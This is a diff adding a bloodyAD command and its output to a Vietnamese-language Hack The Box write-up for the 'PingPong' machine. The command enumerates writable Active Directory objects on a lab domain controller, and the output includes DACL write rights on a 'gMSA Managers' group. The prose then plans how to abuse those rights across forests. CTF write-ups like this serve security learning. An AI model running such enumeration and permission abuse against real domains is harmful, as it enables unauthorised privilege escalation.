@@ -431,6 +431,22 @@ LDAP        DC2             389    DC2              Pong_gMSA$
 
 ## 5. Chiếm lấy Pong_gMSA$
 
+```bash
+~/HTB/Windows/PingPong $ bloodyad -k -d ping.htb -H DC2.pong.htb get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
+permission: WRITE
+
+distinguishedName: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
+DACL: WRITE
+
+distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
+permission: CREATE_CHILD
+```
+
 BloodyAD cho biết cậu này có quyền writeDACL lên nhóm `gMSA Managers`, nhưng mà gượm đã, ta chưa thể lạm dụng nó luôn được.
 Nhóm này nằm ở rừng bên, muốn gia nhập phải đổi loại của nó sang DomainLocal.
 
